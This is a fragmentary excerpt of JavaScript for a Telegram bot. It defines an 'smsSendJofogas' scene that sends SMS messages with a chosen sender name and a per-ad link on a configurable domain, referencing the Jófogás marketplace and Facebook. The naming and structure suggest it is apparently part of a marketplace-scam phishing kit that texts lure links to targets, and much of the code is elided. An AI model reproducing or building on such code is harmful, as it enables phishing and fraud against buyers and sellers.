...
exports.scene = new grammy_scenes_1.Scene('smsSendJofogas');
...
exports.scene.always().callbackQuery('cancel smsSendJofogasFacebook', cancel);
...
exports.scene.wait().on('message:text', async (ctx) => {
    ...
    const response = await (0, sms_1.sendSms)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who, `https://${domen.link}/link/${ad.link}?phone=yes`, ctx.from.id);
    try {
